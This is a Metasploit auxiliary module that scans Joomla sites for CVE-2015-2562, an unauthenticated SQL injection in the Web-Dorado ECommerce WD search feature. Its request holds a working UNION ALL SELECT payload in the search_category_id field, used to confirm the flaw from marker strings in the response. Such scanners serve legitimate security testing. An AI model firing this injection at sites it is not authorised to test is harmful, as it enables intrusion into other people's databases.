##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner',
      'Description' => %q{
      This module will scan for hosts vulnerable to an unauthenticated SQL injection within the
      advanced search feature of the Web-Dorado ECommerce WD 1.2.5 and likely prior.
      },
      'Author'       =>
        [
          'bperry'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-2562']
        ],
      'DisclosureDate' => 'Mar 20 2015'))

      register_options(
        [
          OptString.new('TARGETURI', [ true,  "The path to the Joomla install", '/'])
        ])
  end

  def run_host(ip)
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'option' => 'com_ecommercewd',
        'controller' => 'products',
        'task' => 'displayproducts',
        'Itemid' => '-1'
      },
      'vars_post' => {
        'product_id' => '-1',
        'product_count' => '',
        'product_parameters_json' => '',
        'search_name' => '',
        'search_category_id' => "1) UNION ALL SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]})-- ",
        'filter_filters_opened' => '0',
        'filter_manufacturer_ids' => '1',
        'filter_price_from' => '',
        'filter_price_to' => '',
        'sort_by' => '',
        'sort_order' => 'asc',
        'pagination_limit_start' => '0',
        'pagination_limit' => '12'
      }
    })

    unless res && res.body
      vprint_error("Server did not respond in an expected way")
      return
    end

    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/

    if result
      print_good("Vulnerable to CVE-2015-2562 (search_category_id parameter SQL injection)")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Web-Dorado ECommerce WD search_category_id SQL injection",
        :refs  => self.references.select { |ref| ref.ctx_val == "2015-2562" }
      })
    end

  end
end
